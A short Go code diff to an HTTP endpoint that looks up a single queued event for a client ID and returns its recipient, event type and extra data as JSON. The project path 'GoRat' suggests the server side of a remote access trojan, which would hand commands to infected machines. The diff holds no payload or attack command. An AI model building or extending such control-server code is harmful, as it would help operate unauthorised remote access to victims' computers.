@@ -2,7 +2,6 @@ package endpoints
 
 import (
 	"encoding/json"
-	"fmt"
 	"net/http"
 
 	"github.com/NotKatsu/GoRat/modules/database"
@@ -33,9 +32,9 @@ func EventsGet(w http.ResponseWriter, r *http.Request) {
 				}
 			}
 		} else {
-			EventsFoundArray := database.GetClientEvents(customID)
+			EventFound := database.GetClientEvent(customID)
 
-			if len(EventsFoundArray) == 0 {
+			if EventFound.Recipient == "None" {
 				ErrorReturnStruct := Error{
 					ErrorCode:    http.StatusForbidden,
 					ErrorMessage: "There is no events for the client, please try again later.",
@@ -54,9 +53,24 @@ func EventsGet(w http.ResponseWriter, r *http.Request) {
 					}
 				}
 			} else {
-				clientEventsArray := database.GetClientEvents(customID)
+				EventFoundReturnStruct := EventFoundReturn{
+					Recipient: EventFound.Recipient,
+					EventType: EventFound.EventType,
+					Extra:     EventFound.Extra,
+				}
+				w.WriteHeader(http.StatusOK)
 
-				fmt.Println(clientEventsArray)
+				EventFoundReturnStructMarshal, err := json.Marshal(EventFoundReturnStruct)
+
+				if err != nil {
+					pterm.Fatal.WithFatal(true).Println(err)
+				} else {
+					_, err := w.Write(EventFoundReturnStructMarshal)
+
+					if err != nil {
+						pterm.Fatal.WithFatal(true).Println(err)
+					}
+				}
 			}
 		}
 
